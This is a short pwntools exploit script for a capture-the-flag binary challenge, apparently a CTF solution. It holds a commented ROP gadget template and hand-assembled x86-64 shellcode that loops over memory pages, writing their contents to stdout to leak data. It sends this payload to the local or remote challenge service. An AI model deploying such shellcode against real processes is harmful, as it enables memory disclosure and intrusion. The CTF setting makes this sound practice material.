#!/usr/bin/env python

from pwn import *
from ctypes import *

import binascii

#===========================================================
#                    PWN TEMPLATE                          #
#                        @pwnbox                           #
#===========================================================

filename = './chal'
elf = context.binary = ELF(filename, checksec=False)
context.log_level = 'debug'

HOST, PORT = 'amt.rs', 31173

if args.R:
    p = remote(HOST, PORT)
else:
    p = process()
    if args.GDB:
        attach(p, gdbscript='')


#===========================================================
#                    EXPLOIT GOES HERE                     #
#===========================================================
# gadgets
# pop_rdi = 0x
# pop_rsi = 0x
# pop_rdx = 0x
# pop_rcx = 0x
# syscall = 0x
# ret = 0x

# offset = 0x0
# padding = b'a'*offset

# payload = flat([
#     ])
#shellcode = asm(shellcraft.write(1, 0x1337, 0x20))

# shellcode = b"\x48\x89\xE5\x48\x83\xEC\x08\x48\xB9\x00\x00\x00\x00\x32\x01\x00\x00\x48\x89\x4D\xF8\x6A\x01\x5F\x6A\x40\x5A\x48\xBB\x00\x70\x33\x71\x33\x01\x00\x00\x48\x2B\x5D\xF8\x53\x48\x31\xF6\x5E\x6A\x01\x58\x0F\x05\x48\x8B\x5D\xF8\x48\x81\xC3\x00\x10\x00\x00\x48\x89\x5D\xF8\x48\x83\xFB\xFF\x75\xCD"
shellcode = b"\x48\x89\xE5\x48\x83\xEC\x08\x48\xB9\x00\xF0\xFF\xFF\x32\x01\x00\x00\x48\x89\x4D\xF8\x6A\x01\x5F\x6A\x40\x5A\x48\xBB\x00\x70\x33\x71\x33\x01\x00\x00\x48\x2B\x5D\xF8\x53\x48\x31\xF6\x5E\x6A\x01\x58\x0F\x05\x48\x8B\x5D\xF8\x48\x81\xEB\x00\x10\x00\x00\x48\x89\x5D\xF8\x48\x83\xFB\xFF\x75\xCD"

p.sendlineafter(b'> ', shellcode)

p.interactive()
